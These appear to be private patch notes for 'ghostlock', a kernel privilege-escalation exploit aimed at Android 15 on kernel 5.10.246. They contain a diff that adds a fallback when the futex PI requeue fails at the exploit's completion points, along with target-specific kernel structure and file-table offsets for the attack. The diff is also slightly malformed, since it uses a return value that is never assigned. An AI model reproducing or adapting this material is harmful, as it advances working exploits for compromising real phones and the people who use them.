# Neo8 patches (all non-public otherwise)
## R7 — `ghostlock/src/core/main.c::run_main_route_threads`
`FUTEX_CMP_REQUEUE_PI` returns `EDEADLK` on Android 15 / 5.10.246. Fallback:
FUTEX_WAKE_PRIVATE and force `route_done=1` to avoid deadlocking the f_wait waiter thread.
```
git diff --stat old..new
--- old
+++ new
@@ once per "Exploit complete" site
   futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
+  if (requeue_ret !=0) { pr_warning("requeue FAILED (kinser R7)"); atomic_store(&route_done, 1);
+    futex_op(&f_wait, FUTEX_WAKE_PRIVATE, 1, NULL, NULL, 0); }
```

## R9-struct — `ghostlock/src/core/target.h`
STRUCT_PAGE_SIZE 0x48 / STRUCT_SLAB_CACHE_OFF 0x18 / MM_STRUCT_SZ 0x3c0.

## fd_set layout — `ghostlock/src/core/target.h` LOCK_OFF / W0_OFF
`LOCK_OFF 0x0E80` `W0_OFF 0x1180` `FOPS_OFF 0x0F80` (与 ghostlock 内置对齐, 详见 log/leak).
